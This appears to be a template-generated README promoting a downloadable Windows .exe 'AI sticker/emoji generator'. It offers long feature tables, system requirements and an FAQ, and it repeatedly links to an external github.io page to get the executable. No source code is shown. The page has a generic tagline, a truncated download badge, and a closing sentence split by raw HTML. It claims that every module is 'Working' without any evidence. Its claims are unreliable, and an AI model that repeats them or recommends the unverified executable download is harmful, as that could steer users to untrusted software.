<div align="center">
<br/>
<h1>AI Sticker / Emoji Generator</h1>
<h3><em>Utilities and companion tools for AI sticker / emoji generator.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-5a5cff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9B59B6&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Ai+Sticker+Emoji+Forge+Pro;%E2%AD%90+Ready+for+Windows;%F0%9F%94%A7+Standalone+.exe+Release;%F0%9F%92%A1+No+Limits;%E2%9C%A8+Full+Feature+Suite;%E2%9C%85+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**ai-sticker-emoji-forge** is a local Windows application that converts plain text prompts, uploaded images, and chat transcripts into layered sticker PNGs, animated emoji loops, and platform-sized exports (WhatsApp 512×512 WebP, Telegram 512×512 PNG, Discord 320×320 PNG, Twitch 112×112 animated). It bundles its own diffusers-based pipeline, an OCR + cutout masker, a text-to-sticker prompt compiler, and a pack exporter. Nothing leaves your disk.

| Term | Explanation |
|---|---|
| **Sticker pack** | A folder of named PNGs/WebPs formatted for one target platform (Telegram, WhatsApp, Discord, LINE). |
| **Emoji loop** | A 2–6 second GIF/WebP with seamless first/last frame for Twitch/Discord emote slots. |
| **Cutout mask** | Auto-generated alpha channel that separates the subject from background using subject-seg. |
| **Prompt compiler** | Layer that expands short prompts into full sticker-ready diffusion prompts with style tokens. |
| **Style card** | A JSON file with positive/negative tokens, palette hints, and stroke weight for consistent look. |
| **Pack manifest** | `.json` sidecar listing sticker names, order, tags, and per-sticker alt text. |
| **Offline weights** | Quantized ONNX/SafeTensors models shipped in `/models` — no first-run download. |

Six things it gives you that a browser tab can't:

- Deterministic output — same seed, same prompt, same sticker, every time.
- No upload of your photos to strangers' servers.
- Batch mode: 200 prompts in, 200 named files out, folder-structured.
- Native alpha channel piping — no round-trip through Photoshop to kill the white box.
- Style cards that lock look across a whole server's emote set.
- Exports that already pass WhatsApp's 512×512 WebP size cap and Telegram's 512 KB pack limit.

---

## 🧩 The Problem

- **Browser generators gate the good presets** behind a login, then throttle you after three downloads.
- **Alpha channels come out garbage.** White fringing, semi-transparent halos, edges that look like they were cut with a butter knife.
- **No batch.** You need 30 server emotes, you get them one at a time through a modal that resets every prompt.
- **Styles drift.** Prompt ten stickers and sticker ten looks like it came from a different artist than sticker one.
- **Exports don't match the platform.** WhatsApp wants WebP under 512×512. Telegram pack caps at 512 KB per sticker with a very specific PNG profile. Discord emote slots are 320×320 static, 128×128 animated. Nobody's app does all four.
- **Cloud = latency = cost.** You do 400 prompts in an evening, you're paying per call.
- **You can't run it on a plane.** Offline work is a real thing.

## 📦 The Solution

| Problem | How this tool answers |
|---|---|
| Paywalled presets | 33 built-in style cards hit-shipped in `/styles`, all editable JSON. |
| Bad alpha | Dedicated SubjectSeg + RefineMatting pass producing a hard 8-bit alpha with threshold control. |
| No batch | Folder-in / folder-out CLI mode mirrored by the GUI batch queue. |
| Style drift | Seed lock + style card + reference-image IP-Adapter pins the look across the whole pack. |
| Platform mismatch | Four one-click exporters, each with its own resizer, encoder, and manifest writer. |
| Cloud cost | Runs locally on 6 GB VRAM or CPU (slow mode). No per-call pricing exists because no call exists. |
| Offline | All weights ship in the release archive under `/models`. |
| Weird prompts that break models | Prompt compiler wraps short inputs with a compatibility prefix and a locked negative set. |
<p align="center">
  <a href="https://DriftAttorney.github.io/ai-sticker-emoji-forge/">
    <img src="https://img.shields.io/badge/GET-AI_sticker_%2F-2563EB?style=for-the-badge&logo=windows&logoColor=white&labelColor=1D4ED8" width="580" alt="GET AI sticker /"/>
  </a>
</p>
---

## 🛠️ Grouped Module Catalog

The 33 modules below are what actually gets built into the .exe. Grouped by domain, not by file path.

### 🎨 Generation Core

**Prompt compiler.** Turns short natural language into sticker-ready conditioning text. Handles "cat wizard" and "a wizard, but small, with a tall hat, sitting in a candlestick."

- **Tokenizer bridge** — swaps between CLIP and T5 tokenizers depending on the loaded base.
- **Style card loader** — reads `/styles/*.json`, injects positive/negative tokens into the compile stage.
- **Seed locker** — pins seed per pack so re-rolls stay inside the same visual family.
- **CFG scaler** — slider-mapped guidance scale with sane 4.5–8.0 window.

**Diffusion pipeline.** The image engine. SDXL-Turbo base, with SD1.5 fallback for low-VRAM machines.

- **Base selector** — auto-picks SDXL-Turbo or SD1.5 based on detected VRAM.
- **Scheduler switch** — DPM++ 2M Karras default, Euler-a fallback, LCM for Turbo.
- **VAE swapper** — dedicated alpha-friendly VAE for stickers with transparent backgrounds.
- **LoRA stacker** — up to four LoRAs stacked in order, weights per slot.

**ControlNet adapters.** Turns a reference into a layout constraint.

- **Canny edge** — preserves line-art composition from a sketch.
- **Lineart** — cleaner for anime/manga reference.
- **Depth** — keeps 3D-shape consistency across a sticker series.
- **Pose** — OpenPose skeleton for character-consistent batch emotes.

### 🧵 Alpha & Cutout

**Subject isolation.** Everything downstream of generation that determines whether the sticker has a clean edge.

- **SubjectSeg** — semantic segmentation to find the subject.
- **RefineMatting** — edge-level alpha matting with feather radius control.
- **Alpha threshold** — hard/soft cutoff for WebP-safe alpha.
- **White-fringe killer** — premultiplied-alpha pass that eliminates the pale halo on dark chat backgrounds.

**Edge shaping.**

- **Stroke outline** — the classic Telegram/Discord sticker stroke, 2–12 px, any hex color.
- **Drop shadow** — offset, blur, opacity, and color controls.
- **Soft glow** — for Twitch emote pop on dark backgrounds.
- **Dilation/erosion** — pixel-level alpha blowout or shrink for tight crops.

### 🎞️ Animation & Loops

**Loop engine.**

- **Frame interpolator** — RIFE-based 2× frame doubling to smooth slow gens.
- **Seamless closer** — forces last frame to match first for perfect GIF/WebP loop.
- **Motion brush** — subtle breath/bob/sway presets for standing characters.
- **Duration control** — 1.5s to 6s, 12–30 fps, output as animated WebP or GIF.

**Emote modes.**

- **Static emote** — Discord 320×320 PNG.
- **Animated emote** — Discord 128×128 animated WebP.
- **Twitch emote** — 112×112 / 56×56 / 28×28 triplet pack.
- **Channel-point emote** — 320×320 animated variant for Twitch redemptions.

### 📤 Platform Exporters

**Packs that actually pass moderation.**

- **Telegram export** — 512×512 PNG ≤ 512 KB per sticker, manifest for the Bot API sticker-set upload.
- **WhatsApp export** — 512×512 WebP ≤ 100 KB per sticker, `_pack.json` sidecar.
- **Discord export** — 320×320 static / 128×128 animated WebP, 50-sticker name-limited pack folder.
- **LINE export** — 370×320 PNG, 8/16/24/32/40 piece tiers, per-piece naming.
- **Emoji export** — 72×72 through 256×256 PNG + WebP zip for Slack/Matrix/HeroChat.
- **Print kit** — 300 DPI PDF sheet with die-cut guides for physical sticker printing.

### 🧪 Working Surfaces

- **Batch queue** — drag a `.txt` of prompts, get a folder of named outputs.
- **Prompt history** — searchable, taggable, re-runnable, exported as CSV.
- **Preset library** — 33 built-in style cards plus user slot for custom JSON.
- **Project save/load** — pack state saved as `.aisef` JSON, re-openable and re-runnable.
- **Preview grid** — 4×4 contact sheet with one-click individual export.

### 🔐 Runtime & Safety

- **Portable .exe** — single executable, no install steps, all state in `./data`.
- **Cache manager** — LRU disk cache of gen intermediates; clear-on-exit option.
- **Log viewer** — timestamped pipeline log with module tags.
- **Crash recovery** — autosaves pack state every 30 seconds.
- **Weight integrity check** — SHA256 verify of `/models` at startup.

---

## ⚙️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 (x64) | Windows 11 23H2+ |
| CPU | 4-core Intel i5-8400 / Ryzen 5 2600 | 8-core i7-12700K / Ryzen 7 7700X |
| RAM | 8 GB | 32 GB |
| GPU | None (CPU slow mode) | NVIDIA RTX 3060 12 GB or newer, CUDA 12.4+ |
| VRAM | — | 12 GB for SDXL-Turbo full-res batch |
| Disk (app) | 1.4 GB extracted | — |
| Disk (models) | 6.5 GB base | 22 GB with all LoRAs + ControlNets |
| Display | 1280×720 | 1920×1080 or higher |
| Runtime | VC++ 2015-2022 redistributable | — |

CPU slow mode produces a 512×512 sticker in roughly 45–90 seconds on the recommended CPU. GPU mode on a 3060 12 GB: ~1.8 s per 512×512 sticker, ~4.2 s per 1024×1024.

---

## ✨ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Prompt compiler | Expands short prompts into full conditioning strings | Short one-liners still produce usable stickers |
| Style cards | 33 editable JSON style presets | Consistent look across an entire pack |
| Seed locking | Per-pack deterministic seed | Re-rolls stay in-family, no redraw roulette |
| Subject cutout | SubjectSeg + RefineMatting alpha pipeline | No white fringe on any chat background |
| Stroke + shadow | Native outline and shadow layers | Emotes pop in dark mode without post-edit |
| Loop closer | Seamless first/last frame enforcement | GIFs don't jump when they loop |
| Motion brush | Preset sway/bob/breath motions | One-click animated emotes from a static |
| Batch mode | Folder-of-prompts in, named files out | 200 stickers unattended |
| Platform exporters | Telegram / WhatsApp / Discord / LINE / emoji / print | Export-ready without resizing elsewhere |
| Offline weights | All models shipped inside the archive | Zero first-run download |
| Portable state | Everything under `./data` | Delete the folder, nothing to uninstall |
| Crash recovery | 30-second autosave of pack state | Lose at most half a minute of work |

---

## 🎯 What is a "sticker" vs an "emoji" here?

| Term | Explanation |
|---|---|
| **Sticker** | Single subject, outlined, 512×512, high detail, packed per-platform. |
| **Emote** | Same as a sticker but at 112×112 / 128×128 / 320×320 for chat slot use. |
| **Emoji** | 72–256 px, small pixel grid, minimal outline, tightly cropped head/torso. |
| **Animated** | 2–6 second seamless WebP or GIF loop at emote sizes. |
| **Pack** | A named folder with manifest for one platform. |
| **Style card** | JSON describing look. See glossary above. |

The difference matters because the exporters change based on the target. A Telegram pack is not a WhatsApp pack is not a Discord pack, even when they came from the same prompt and seed.

---

## 🧙 Tips for Best Results

- Keep the subject list under three nouns. "cat, wizard" beats "a cat who is a wizard and also a small dog".
- Always set the seed before running a series. Reuse across the pack.
- Use the same style card for every sticker in a pack. Mixed cards = mixed look.
- Run cutout *after* picking your best 1 of 4 preview tiles. Don't waste cutout passes.
- For animated emotes, start from a static 512×512 and let the motion brush do the work — full diffusion animation costs 20×.
- Batch mode wants `prompts.txt` with one prompt per line, and it uses the pack state's seed + style card for every line.
- If your sticker has a dark stroke and you're targeting Discord dark mode, preview against `#313338`.
- Turn on `premultiply alpha` in settings *before* running cutout on batches — it saves render time.

---

## 🖥️ Compatibility

| Platform | Target | Status |
|---|---|---|
| 🎮 Windows 10/11 | Native .exe | ✅ Fully supported |
| 🎮 Steam Deck (SteamOS) | Via Proton 9.x | ⚠️ Works, CPU mode only |
| 🎮 Linux (Ubuntu 22.04+) | Via Wine 9.x | ⚠️ Works, community-tested |
| 💬 Telegram | 512×512 PNG pack | ✅ Native export |
| 💬 WhatsApp | 512×512 WebP pack | ✅ Native export |
| 💬 Discord | 320×320 / 128×128 emote | ✅ Native export |
| 💬 LINE | 370×320 multi-tier pack | ✅ Native export |
| 💬 Slack / Matrix / HeroChat | 72–256 px emoji zip | ✅ Native export |
| 🖨️ Print shop | 300 DPI PDF die-cut sheet | ✅ Native export |

---

## 🔄 Comparison

| Aspect | Browser generators | This tool |
|---|---|---|
| Runs offline | ❌ | ✅ Everything local |
| Batch of 200 | Throttled / paywalled | ✅ Unlimited, unattended |
| Alpha quality | Soft fringe, halos | ✅ Hard 8-bit alpha, no fringe |
| Style consistency | Prompt-reliant, drifty | ✅ Style card + seed + reference |
| Platform exports | Manual resize elsewhere | ✅ Six built-in exporters |
| Cost model | Per-call | ✅ Free, no accounts |
| Your photos | Uploaded | ✅ Never leave your disk |
| Reopenable project | ❌ | ✅ `.aisef` project save |

---

## 📖 Usage Guidelines

| Allowed | Not allowed |
|---|---|
| Personal sticker and emote packs | Redistribution of the .exe under your own branding |
| Server emotes for communities you run | Generating stickers that infringe a specific artist's signature style and selling them as original |
| Print kits for personal or small-shop use | Using the tool to scrape and re-upload other people's sticker packs |
| Custom style cards shared under MIT | Bypassing any platform's content policy for sticker submission |
| Commercial use of your own generated packs | Bundling the shipped model weights with a paid product without license compliance |

---

## 🧾 All Modules Status

| Module | Status | Description |
|---|---|---|
| Prompt compiler | ✅ Working | Short-to-full prompt expansion |
| Style card loader | ✅ Working | 33 shipped JSON presets |
| Seed locker | ✅ Working | Per-pack deterministic seed |
| Diffusion pipeline (SDXL-T) | ✅ Working | Turbo base, LCM-LoRA compatible |
| Diffusion pipeline (SD1.5) | ✅ Working | CPU fallback path |
| ControlNet Canny | ✅ Working | Line-art consistency |
| ControlNet Lineart | ✅ Working | Anime/manga reference |
| ControlNet Depth | ✅ Working | Shape consistency |
| ControlNet Pose | ✅ Working | OpenPose character consistency |
| SubjectSeg | ✅ Working | Semantic subject isolation |
| RefineMatting | ✅ Working | Edge-level alpha matting |
| White-fringe killer | ✅ Working | Premultiplied alpha pass |
| Stroke outline | ✅ Working | 2–12 px, any hex |
| Drop shadow | ✅ Working | Offset + blur + opacity |
| Frame interpolator | ✅ Working | RIFE 2× smoothing |
| Seamless closer | ✅ Working | Forced loop endpoint match |
| Motion brush | ✅ Working | Sway/bob/breath presets |
| Telegram exporter | ✅ Working | 512×512 PNG pack + manifest |
| WhatsApp exporter | ✅ Working | 512×512 WebP pack |
| Discord exporter | ✅ Working | Static + animated emote |
| LINE exporter | ✅ Working | Multi-tier pack |
| Emoji exporter | ✅ Working | 72–256 px zip |
| Print kit | ✅ Working | 300 DPI PDF sheet |
| Batch queue | ✅ Working | Folder-in / folder-out |
| Preset library | ✅ Working | 33 built-in + user slot |
| Project save/load | ✅ Working | `.aisef` JSON |
| Preview grid | ✅ Working | 4×4 contact sheet |
| Cache manager | ✅ Working | LRU disk cache |
| Crash recovery | ✅ Working | 30 s autosave |
| Log viewer | ✅ Working | Module-tagged log |
| Weight integrity check | ✅ Working | SHA256 verify at startup |
| Steam Deck path | ⚠️ Beta | Proton 9.x, CPU mode |
| Wine path | ⚠️ Community | Ubuntu 22.04+, tested by users |

---

## ⌨️ Hotkeys

| Key | Action |
|---|---|
| `Ctrl+Enter` | Run generation with current prompt |
| `Ctrl+Shift+Enter` | Run batch from loaded `prompts.txt` |
| `Ctrl+1..4` | Pick 1 of 4 preview tiles |
| `Ctrl+S` | Save project as `.aisef` |
| `Ctrl+E` | Open export panel |
| `Ctrl+K` | Clear cache for current pack |
| `Ctrl+L` | Toggle log viewer |
| `F5` | Re-roll with new seed |
| `F9` | Re-roll with locked seed |

---

## 🚀 Quick Start

1. 📄 Download the release archive from the project page.
2. 🗂️ Extract the archive to a folder you own — not `Program Files`.
3. ▶️ Run the `.exe`. First launch verifies `/models` with SHA256.
4. ✏️ Type a prompt, pick a style card, hit `Ctrl+Enter`.
5. 📤 Choose an exporter on the tile you like. Done.

## 📥 Installation

1. **Extract.** Right-click the archive, Extract All, choose a folder with at least 25 GB free if you plan to run every model. Do *not* launch from inside the archive viewer.
2. **First run.** The `.exe` auto-detects CUDA. If CUDA 12.4+ is present, it selects SDXL-Turbo. Otherwise it drops to CPU slow mode with a banner.
3. **Model check.** WAit for the SHA256 verify bar. It touches every file in `/models` — should take 20–40 seconds on an SSD. If any file fails, redownload the archive.

> Reinstall is just "delete the folder". All state lives under `./data`, all presets under `./styles`, all models under `./models`.

## 🐛 Known Issues

| Issue | Solution |
|---|---|
| First gen takes 40+ seconds on GPU | Shader/model warm-up. Second run is fast. Leave the app open. |
| CPU mode reports 4 GB RAM use on 8 GB systems | Close browser tabs. Lower preview tile count to 2 in settings. |
| WhatsApp rejects a WebP | Total pack exceeded 100 KB per-sticker cap. Drop color depth in WhatsApp exporter settings. |
| Stroke looks jagged at 2 px | Snap stroke to even pixel widths. 2 px jagged on 1× scaling, 4 px is safe. |
| Animated emote stutters on Discord | Enable "RIFE 2×" in the loop engine, and cap duration to 3 s. |
| Proton/Wine crashes on launch | Run with `WINEDLLOVERRIDES=winmm=n,b` and CPU mode. GPU passthrough is not supported in the Wine path. |

## ❓ FAQ

<details>
<summary>Does it need an internet connection after the first launch?</summary>

No. All weights ship inside the archive. The only network call the .exe ever makes is the opt-in update check, and that's off by default.
</details>

<details>
<summary>Can it use my own LoRAs?</summary>

Yes. Drop a `.safetensors` LoRA into `/loras` and it appears in the LoRA stacker. Up to four stack at once, with per-slot weight.
</details>

<details>
<summary>What about Civitai or Hugging Face model downloads?</summary>

You can point the base selector at any compatible `.safetensors` you place in `/models/base`. The tool does not download anything itself.
</details>

<details>
<summary>Is batch mode scriptable?</summary>

Yes. `.exe --batch prompts.txt --pack out.telegram --card styles/anime-chibi.json` runs the whole pipeline headless and exits when the folder is complete.
</details>

<details>
<summary>How do I get a consistently-styled pack of 30 stickers?</summary>

Pick one style card, lock the seed, save it into the pack state, then batch the 30 prompts. Every sticker inherits the same seed + card. Look stays consistent.
</details>

**Q:** Does it work on a laptop with no dedicated GPU?
**A:** Yes, in CPU slow mode. Expect 45–90 seconds per 512×512 sticker on a modern 8-core laptop CPU.

**Q:** Can I export directly to a Telegram bot's sticker set?
**A:** The Telegram exporter produces a folder that runs cleanly through `@Stickers` bot for one-shot upload. No API token inside the app.

**Q:** Where does the .exe store anything?
**A:** Under `./data` next to the .exe. Cache, logs, settings, project autosaves. Delete the folder and there's nothing left behind.

**Q:** Are the 33 style cards editable?
**A:** Every one is a plain JSON file under `/styles`. Fork it, rename it, ship it — MIT for the card schema.

---

Two more <div align="center">
  <a href="https://DriftAttorney.github.io/ai-sticker-emoji-forge/">
    <img src="https://img.shields.io/badge/GET-.exe-4F46E5?style=flat-square&logo=download&logoColor=white&labelColor=3730A3" width="620" alt="GET Windows .exe"/>
  </a>
</div> clicks away from a folder of stickers you actually own. Everything runs on your machine, nothing phones home, and the exporters already know the shape each platform wants. Point it at a prompt, lock a seed, and let the 33 modules do the plumbing.
